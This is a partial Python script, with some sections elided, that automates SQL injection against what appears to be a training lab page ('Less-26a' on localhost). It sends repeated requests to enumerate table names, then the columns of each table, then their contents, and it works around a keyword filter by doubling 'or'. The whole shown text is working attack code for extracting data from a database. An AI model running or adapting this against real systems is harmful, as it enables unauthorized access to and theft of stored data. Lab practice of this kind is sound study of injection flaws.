...
url = "http://localhost:1234/Less-26a/?id="
...
while('Subquery returns more than 1 row' in response.text):
    response = requests.post(url+payload.format(get_table))
temp = response.text[571:-297-len(payload.format(get_table))]
tables = temp.split(',')
print("Tables :", *tables)
for i in tables:
    print("From Table", i, ": ")
    ...
    while('Subquery returns more than 1 row' in response.text):
        response = requests.post(url+payload.format(find))
    temp = response.text[571:-295-len(payload.format(find))]
    columns = temp.split(',')
    ...
    for j in columns:
        ...
        while('Subquery returns more than 1 row' in response.text):
            response = requests.post(url+payload.format(find))
        print(response.text[571:-305-len(payload.format(find).replace('oorr', 'or'))])
